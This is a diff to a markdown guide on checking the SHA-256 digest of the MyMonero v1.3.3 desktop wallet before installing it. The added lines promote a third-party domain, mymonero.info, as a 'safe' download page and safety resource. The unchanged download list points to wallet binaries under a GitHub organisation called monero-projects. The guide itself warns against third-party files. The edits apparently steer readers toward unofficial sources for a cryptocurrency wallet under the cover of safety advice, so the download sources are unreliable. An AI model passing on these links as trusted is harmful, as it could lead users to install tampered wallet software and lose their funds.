@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A SHA-256 integrity check compares a digest calculated from your downloaded file with the digest published on the GitHub release page. For MyMonero, use the final desktop release v1.3.3 and do not run the file if the values differ.
 
+
+Prefer reading on the web? The [MyMonero migration scams page](https://mymonero.info/mymonero-migration-scams) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) covers the common questions.
+
 ## You'll see this if
 - You downloaded the MyMonero desktop application and want to check the file before opening it.
 - The release page shows a SHA-256 value but you are unsure how to calculate one.
@@ -61,7 +64,7 @@ A digest match cannot guarantee that the application has ongoing support. MyMone
 ## Prevention
 Check the release page before every download, not an old bookmark to a third-party file. Make sure the version, platform asset, and digest correspond. Keep the downloaded release and its source reference together until you are satisfied the check is complete. A hash copied from a message is not a substitute for the value shown by the project release page.
 
-Separate installation checks from wallet recovery. The digest tool does not need your seed, private view key, private spend key, password, or wallet file. If a person or website asks for any of those in exchange for a checksum, stop communicating. Back up your seed securely and use [the safe backup guide](./mymonero-backup-seed-safely.md). If you later need to restore, make sure you understand [the difference between 13- and 25-word seeds](./mymonero-seed-13-vs-25-words.md).
+Separate installation checks from wallet recovery. The digest tool does not need your seed, private view key, private spend key, password, or wallet file. If a person or website asks for any of those in exchange for a checksum, stop communicating. Back up your seed securely and use [the safe backup guide](./mymonero-backup-seed-safely.md). If you later need to restore, make sure you understand the difference between 13- and 25-word seeds.
 
 ## FAQ
 <details><summary>Does a matching checksum mean the app is completely safe?</summary>
@@ -92,6 +95,7 @@ No. A file integrity check does not use wallet information. Never disclose your 
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
